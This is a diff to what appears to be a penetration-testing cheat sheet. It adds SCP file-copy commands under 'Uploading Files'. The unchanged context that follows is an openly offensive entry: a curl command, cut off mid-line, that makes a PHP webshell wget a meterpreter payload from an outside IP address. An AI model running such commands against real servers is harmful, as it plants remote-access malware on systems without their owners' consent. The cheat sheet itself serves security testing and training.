@@ -999,6 +999,12 @@ File Transfers
 -   Uploading Files
     -------------------------------------------------------------------------------------------------------------
 
+    -   SCP
+    
+        scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
+        
+        scp localfile username@$ip:~/Folder/
+
     -   Upload shell using limited php shell cmd  
         use the webshell to download and execute the meterpreter  
         \[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O
